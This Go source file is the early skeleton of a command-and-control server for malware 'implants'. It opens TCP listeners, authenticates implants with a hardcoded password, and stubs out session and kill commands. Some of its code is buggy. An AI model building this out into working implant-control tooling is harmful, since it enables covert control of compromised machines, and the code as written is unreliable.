package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
)

func makeListener(port string) (bool, net.Listener) {
	addr := ":" + port
	addr = strings.TrimSuffix(addr, "\n") //Ntibihla haydeh ktiir mi2ziyeh
	tcpAddr, err := net.ResolveTCPAddr("tcp4", addr)
	if err != nil {
		return false, nil
	}
	tcpListener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		return false, nil
	}
	return true, tcpListener
}

func listen(tcpListen net.Listener) (bool, net.Conn) {
	conn, err := tcpListen.Accept()
	if err != nil {
		fmt.Println("Error Accpeting Connection")
		return false, nil
	}
	auth := make([]byte, 32)
	read_len, err := conn.Read(auth)
	if read_len < 1 {
		fmt.Println("Auth Failed. Bytes < 1")
		tcpListen.Close()
		return false, nil
	}
	if err != nil {
		fmt.Println("Something went wrong reading from the connection")
		tcpListen.Close()
		return false, nil
	}
	authString := string(auth[:read_len])
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("Implant failed to authenticate")
		tcpListen.Close()
		return false, nil
	}
	return true, conn
}

func (list *clientList) registerClient(net.Conn) {
	newNode := &Client{}
	if list.head == nil {
		list.head = newNode
	} else {
		current := list.head
		for current.next != nil {
			current = current.next
		}
		current.next = newNode
	}
}

func (list *clientList) displayClient() {
	current := list.head

	if current == nil {
		fmt.Println("Client list is empty")
		return
	}

	fmt.Print("Linked list: ")
	for current != nil {
		fmt.Printf("%d ", current.name)
		current = current.next
	}
	fmt.Println()
}

type clientList struct {
	head *Client
}
type Client struct {
	name  string
	IP    string
	ID    int
	state string
	next  *Client
}

func (list *listenerList) registerListener(port string) {
	newListener := &Listener{port: port}
	if list.head == nil {
		list.head = newListener
	} else {
		current := list.head
		for current.pListener != nil {
			current = current.pListener
		}
		current.pListener = newListener
	}
}

func (list *listenerList) displayListeners() {
	current := list.head
	if current == nil {
		fmt.Println("List is empty")
		return
	}
	for current.pListener != nil {
		fmt.Println(current.port)
		current = current.pListener
	}
}

type Listener struct {
	port      string
	pListener *Listener
}
type listenerList struct {
	head *Listener
}

func main() {
	fmt.Println("Splinter's Cell")
	listnerList := listenerList{}
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("SPLINTER >>> ")
		command, err := reader.ReadString('\n')
		//Below the madness begins
		regexListen := regexp.MustCompile(`listen -p \d+`)
		matchListen := regexListen.FindString(command)
		if matchListen != "" {
			command = strings.Split(command, " -p ")[1]
			//fmt.Println(command)
			//status, tcpListener := makeListener(command)
			//service := ":1234"
			status, tcpListener := makeListener(command)
			if !status {
				fmt.Println("Could not create listener")
				continue
			}
			listnerList.registerListener(command)
			listen(tcpListener)
		}
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		switch command {
		case "listen":
			fmt.Println("Create a listener with the following: listener -p <port>")
		case "kill":
			fmt.Println("Kills an implant and 'one day' performs cleanup: kill <clientID>")
		case "session":
			fmt.Println("Open a session with an implant: session <clientID>")
		case "exit":
			fmt.Println("Bye!")
			os.Exit(0)
		default:
			fmt.Println("List of available commands: listen, kill, session, exit")
		}
	}
}
